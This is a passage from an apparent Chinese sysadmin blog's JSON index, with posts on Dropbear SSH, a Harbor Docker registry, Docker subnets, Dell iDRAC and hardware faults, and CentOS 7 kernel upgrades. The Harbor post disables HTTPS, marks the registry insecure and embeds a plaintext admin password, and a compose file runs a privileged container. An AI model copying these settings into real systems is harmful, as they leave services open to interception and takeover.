!!!!!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e附上undionly.kpxe：\u003ca href=\"./undionly.kpxe\"\u003eundionly.kpxe\u003c/a\u003e\u003c/p\u003e","title":"DNSMASQ配置PXE的方式"},{"content":"合规审计经常需要给各种软件打补丁，比如openssh，如果是高版本还好说。如果让你补 centos 6的 openssh，\n那恐怕就要喝一壶了。替代方案如下：\ngit：https://github.com/mkj/dropbear 下载地址：https://matt.ucc.asn.au/dropbear/dropbear.html\n一、介绍 dropbear作为一款基于ssh协议的轻量级sshd服务器，相比OpenSSH，其更简洁，更小巧，运行起来内存占用比也更小。在应用进程上，OpenSSH会开启两个sshd进程服务，而dropbear只开启一个进程，相较于OpenSSH，其对于硬件要求也更低，也更节约系统资源。\ndropbear实现完整的SSH客户端和服务器版本2协议，不支持SSH版本1协议的向后兼容性，以节省空间和资源，并避免在SSH版本1的固有的安全漏洞。\ndropbear主要有以下程序：\n服务程序：dropbear（类似于Openssh的sshd） 客户程序：dbclinet（累世于Openssh的ssh） 密钥生成程序：dropbearkey\n二、下载安装\nwget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2 tar jxvf dropbear-2020.81.tar.bz2 cd dropbear-2020.81 ./configure make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; install mkdir /etc/dropbear/ dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key dropbear -E -p 2222 #启动ssh服务 dropbear -FE -p 2222 #-F指定前台运行 客户端连接： ssh 192.168.89.37 -p 2222 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n报错：zlib error 或者make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;出错 解决方法： wget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz tar zxvf zlib-1.2.10.tar.gz cd zlib-1.2.10 ./configure --prefix=/usr/local/zlib ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n#centos6环境安装方法，找到三个包 rpm -vih libtomcrypt-1.17-25.el6.x86_64.rpm rpm -vih libtommath-0.42.0-5.el6.x86_64.rpm rpm -vih dropbear-2017.75-1.el6.x86_64.rpm chkconfig sshd off chkconfig dropbear on /etc/init.d/dropbear status dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key /etc/init.d/sshd stop \u0026amp;\u0026amp; /etc/init.d/dropbear start ","permalink":"https://rendoumi.com/posts/20221219-dropbear/","summary":"\u003cp\u003e合规审计经常需要给各种软件打补丁，比如openssh，如果是高版本还好说。如果让你补 centos 6的 openssh，\u003c/p\u003e\n\u003cp\u003e那恐怕就要喝一壶了。替代方案如下：\u003c/p\u003e\n\u003cp\u003egit：https://github.com/mkj/dropbear\n下载地址：https://matt.ucc.asn.au/dropbear/dropbear.html\u003c/p\u003e\n\u003cp\u003e一、介绍\ndropbear作为一款基于ssh协议的轻量级sshd服务器，相比OpenSSH，其更简洁，更小巧，运行起来内存占用比也更小。在应用进程上，OpenSSH会开启两个sshd进程服务，而dropbear只开启一个进程，相较于OpenSSH，其对于硬件要求也更低，也更节约系统资源。\u003c/p\u003e\n\u003cp\u003edropbear实现完整的SSH客户端和服务器版本2协议，不支持SSH版本1协议的向后兼容性，以节省空间和资源，并避免在SSH版本1的固有的安全漏洞。\u003c/p\u003e\n\u003cp\u003edropbear主要有以下程序：\u003c/p\u003e\n\u003cp\u003e服务程序：dropbear（类似于Openssh的sshd）\n客户程序：dbclinet（累世于Openssh的ssh）\n密钥生成程序：dropbearkey\u003c/p\u003e\n\u003cp\u003e二、下载安装\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar jxvf dropbear-2020.81.tar.bz2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e dropbear-2020.81\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003e install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /etc/dropbear/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbear -E -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e   \u003cspan class=\"c1\"\u003e#启动ssh服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbear -FE -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#-F指定前台运行\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e客户端连接：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh 192.168.89.37 -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e报错：zlib error 或者make \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003e出错\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e解决方法：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf zlib-1.2.10.tar.gz \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e zlib-1.2.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/zlib\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u003c/p\u003e","title":"Dropbear配置SSH服务"},{"content":"一：我们在公司内部建立了Docker内部镜像仓库：\nharbor是vmware出的一个docker镜像仓库，本质是一组容器的集合体，算是一个多容器的pod.\n数据卷缺省是宿主机的/data，所以我们把iscsiu挂在/data\n主机：172.18.31.28\n首先安装docker-ce\n添加docker-ce源：\nyum install epel-release\ryum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\ryum install docker-ce -y\ryum install ntp -y\r启动自动同步时间:\ntimedatectl set-ntp yes #此处可用yes,no,1或0\r配置时区:\ntimedatectl set-timezone Asia/Shanghai\r配置Docker启动参数：\nmkdir -p /etc/docker\rcat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\r之后装的所有Docker的宿主机，如果要用到这个私有仓库的话：\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;insecure-registries\u0026quot;:[\u0026quot;172.18.31.28\u0026quot;],\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\r启动docker\nsystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\r​ 安装Docker-compose\nyum install docker-compose\rpip3 install -I requests==2.9 来强制修正\r下载harbor的离线安装包\ncd /root\rhttps://github.com/goharbor/harbor/releases/download/v2.0.1/harbor-offline-installer-v2.0.1.tgz\rtar zxvf harbor-offline-installer-v2.0.1-rc1.tgz\rcd harbor\r编辑配置文件：\ncp harbor.yml.tmpl harbor.yml\rvi harbor.yml\rhostname: 172.18.31.28\rharbor_admin_password: Fuckxxxbbaasskk\r隐掉443，因为我们是内网用，配个证书也是假的，所以关了443\r#https:\r# https port for harbor, default is 443\r# port: 443\r# The path of cert and key files for nginx\r# certificate: /your/certificate/path\r换掉DB的pass\rdatabase:\r# The password for the root user of Harbor DB. Change this before any production use.\rpassword: xxxxxxx\r# private_key: /your/private/key/path\r然后直接安装：\n./install.sh\r安装完成了就，看一眼：\ndocker-compose ps\r然后直接登录 http://172.18.31.28 就好\n缺省有一个library的开放项目，我们推一个busybox过去测试一下：\n首先拉一个busybox到本地\rdocker pull busybox\r打个tag\rdocker tag busybox:latest 172.18.31.28/library/busybox\r推上去\rdocker push 172.18.31.28/library/busybox\r这时候再去31.28的library项目里看，就能看到新推上去的busybox镜像了\n在其他的机器上，首先登录，然后就可以拉镜像了。 再举个实际例子，我们把metallb给推上去备用：\n打tag\rdocker tag docker.io/metallb/controller:v0.9.3 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\r推上去\rdocker push 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\r","permalink":"https://rendoumi.com/posts/20221219-docker_harbor/","summary":"\u003cp\u003e一：我们在公司内部建立了Docker内部镜像仓库：\u003c/p\u003e\n\u003cp\u003eharbor是vmware出的一个docker镜像仓库，本质是一组容器的集合体，算是一个多容器的pod.\u003c/p\u003e\n\u003cp\u003e数据卷缺省是宿主机的/data，所以我们把iscsiu挂在/data\u003c/p\u003e\n\u003cp\u003e主机：172.18.31.28\u003c/p\u003e\n\u003cp\u003e首先安装docker-ce\u003c/p\u003e\n\u003cp\u003e添加docker-ce源：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eyum install epel-release\r\n\r\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\r\n\r\nyum install docker-ce -y\r\n\r\nyum install ntp -y\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e启动自动同步时间:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003etimedatectl set-ntp yes  #此处可用yes,no,1或0\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e配置时区:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003etimedatectl set-timezone Asia/Shanghai\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e配置Docker启动参数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emkdir -p /etc/docker\r\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r\n{\r\n    \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r\n}\r\nEOF\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e之后装的所有Docker的宿主机，如果要用到这个私有仓库的话：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r\n{\r\n     \u0026quot;insecure-registries\u0026quot;:[\u0026quot;172.18.31.28\u0026quot;],\r\n     \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r\n}\r\nEOF\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e启动docker\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e​\n安装Docker-compose\u003c/p\u003e","title":"docker镜像仓库harbor的搭建与使用"},{"content":"docker默认网段是172.17，和公司的网段172.16和172.18有时候会冲突，解决方法就是换docker网段。\n方案：不改docker网段，创建不和公司网段冲突的docker子网段\ndocker network create --driver=bridge --subnet=172.19.0.0/24 monitor_net 运行容器时指定\ndocker run -it --name \u0026lt;容器名\u0026gt; ---network monitor_net \u0026lt;镜像名\u0026gt; 在docker-compose同样通过networks指定，形式如下：\nversion: \u0026#39;3\u0026#39; networks: monitor: #使用已经存在的网络 external: name: monitor_net services: prometheus: image: prom/prometheus container_name: prometheus hostname: prometheus privileged: true restart: always volumes: - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml ports: - \u0026#34;9091:9090\u0026#34; networks: - monitor links: - alertmanager - node-exporter ","permalink":"https://rendoumi.com/posts/20221219-docker_network/","summary":"\u003cp\u003edocker默认网段是172.17，和公司的网段172.16和172.18有时候会冲突，解决方法就是换docker网段。\u003c/p\u003e\n\u003cp\u003e方案：不改docker网段，创建不和公司网段冲突的docker子网段\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network create --driver\u003cspan class=\"o\"\u003e=\u003c/span\u003ebridge --subnet\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.19.0.0/24 monitor_net\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e运行容器时指定\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -it --name \u0026lt;容器名\u0026gt; ---network monitor_net \u0026lt;镜像名\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在docker-compose同样通过networks指定，形式如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eversion: \u003cspan class=\"s1\"\u003e\u0026#39;3\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   monitor:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"c1\"\u003e#使用已经存在的网络\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     external:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       name: monitor_net  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    prometheus:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        image: prom/prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        container_name: prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        hostname: prometheus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        privileged: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        restart: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - \u003cspan class=\"s2\"\u003e\u0026#34;9091:9090\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - monitor\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        links:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - alertmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            - node-exporter\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Docker的缺省网段冲突问题"},{"content":"Dell服务器设置远程文件共享\n用来加载iso文件，用于安装系统或者修复\n输入172.18.31.2:/export/nfsshare/centos7-live-docker.iso\n缺省是支持4种格式的共享：\nCIFS — //\u0026lt;IP to connect for CIFS file system\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rNFS — \u0026lt; IP to connect for NFS file system\u0026gt;:/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rHTTP — http://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\rHTTPs — https://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; 点击Connect 好的话，就会蹦出Success 然后启动虚拟控制台，Boot菜单选中启动：Virtual CD/DVD/ISO 重启，就可以进入centos7-live-docker.iso的系统了\n","permalink":"https://rendoumi.com/posts/20221218-dell_idrac_remote_share/","summary":"\u003cp\u003eDell服务器设置远程文件共享\u003c/p\u003e\n\u003cp\u003e用来加载iso文件，用于安装系统或者修复\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_110107.png\"\u003e\u003c/p\u003e\n\u003cp\u003e输入172.18.31.2:/export/nfsshare/centos7-live-docker.iso\u003c/p\u003e\n\u003cp\u003e缺省是支持4种格式的共享：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e    CIFS — //\u0026lt;IP to connect for CIFS file system\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    NFS — \u0026lt; IP to connect for NFS file system\u0026gt;:/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    HTTP — http://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\r\n    HTTPs — https://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e点击Connect\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_105140.png\"\u003e\u003c/p\u003e\n\u003cp\u003e好的话，就会蹦出Success\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_105201.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后启动虚拟控制台，Boot菜单选中启动：Virtual CD/DVD/ISO\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_idrac_remote_share/2021-10-09_111519.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重启，就可以进入centos7-live-docker.iso的系统了\u003c/p\u003e","title":"Dell服务器设置远程文件共享"},{"content":"vlt0204, NDC瓦特超了，十有八九是网卡烧了，然后导致主板电压过载。\n前面板日志：VLT0204，登录idrac看到日志：\nThe system board NDC PG voltage is outside of range.\r悲剧了，可能是主板烧了\n处理方法如下：\n一、主板放电\n1、关机 2、拔电源线 3、长按电源开关半分钟不放手 4、半分钟后放手，接回电源线开机看看\n如果以上方法不行，就必须采用第二种方法：\n二、最小化负载排错\n1、拔掉电源2 2、拔掉CPU2 3、拔掉所有内存（只留1条或2条） 4、拔掉网卡 5、启动看看\nR740的内存插法：\nR730的内存插法：\n","permalink":"https://rendoumi.com/posts/20221218-dell_memory/","summary":"\u003cp\u003evlt0204, NDC瓦特超了，十有八九是网卡烧了，然后导致主板电压过载。\u003c/p\u003e\n\u003cp\u003e前面板日志：VLT0204，登录idrac看到日志：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eThe system board NDC PG voltage is outside of range.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171556.png\"\u003e\u003c/p\u003e\n\u003cp\u003e悲剧了，可能是主板烧了\u003c/p\u003e\n\u003cp\u003e处理方法如下：\u003c/p\u003e\n\u003cp\u003e一、主板放电\u003c/p\u003e\n\u003cp\u003e1、关机\n2、拔电源线\n3、长按电源开关半分钟不放手\n4、半分钟后放手，接回电源线开机看看\u003c/p\u003e\n\u003cp\u003e如果以上方法不行，就必须采用第二种方法：\u003c/p\u003e\n\u003cp\u003e二、最小化负载排错\u003c/p\u003e\n\u003cp\u003e1、拔掉电源2\n2、拔掉CPU2\n3、拔掉所有内存（只留1条或2条）\n4、拔掉网卡\n5、启动看看\u003c/p\u003e\n\u003cp\u003eR740的内存插法：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171736.png\"\u003e\u003c/p\u003e\n\u003cp\u003eR730的内存插法：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dell_memory/2020-09-15_171835.png\"\u003e\u003c/p\u003e","title":"Dell机器主板VLT0204故障处理以及内存插法"},{"content":"CentOS7更新内核 内核下载地址：https://elrepo.org/linux/kernel/el7/x86_64/RPMS/\n内核包有两种，ml主流，lt长期支持。\n我们升级核心肯定是为了主流的功能，lt还升它做甚。\n#升级：\nrpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm #查看可用内核\nawk -F\\\u0026#39; \u0026#39;$1==\u0026#34;menuentry \u0026#34; {print i++ \u0026#34; : \u0026#34; $2}\u0026#39; /etc/grub2.cfg #初始化第一个为默认内核\ngrub2-set-default 0 #重新创建内核配置\ngrub2-mkconfig -o /boot/grub2/grub.cfg reboot #后续有需要再装，不需要搞开发就别装！\n#更新kernel-ml-headers rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm #更新kernel-ml-devel rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm ","permalink":"https://rendoumi.com/posts/20221218-centos7_upgrade_kernel/","summary":"\u003ch2 id=\"centos7更新内核\"\u003eCentOS7更新内核\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e内核下载地址：https://elrepo.org/linux/kernel/el7/x86_64/RPMS/\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e内核包有两种，ml主流，lt长期支持。\u003c/p\u003e\n\u003cp\u003e我们升级核心肯定是为了主流的功能，lt还升它做甚。\u003c/p\u003e\n\u003cp\u003e#升级：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#查看可用内核\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk -F\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;$1==\u0026#34;menuentry \u0026#34; {print i++ \u0026#34; : \u0026#34; $2}\u0026#39;\u003c/span\u003e /etc/grub2.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#初始化第一个为默认内核\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-set-default \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#重新创建内核配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-mkconfig -o /boot/grub2/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereboot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e#后续有需要再装，不需要搞开发就别装！\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#更新kernel-ml-headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#更新kernel-ml-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh 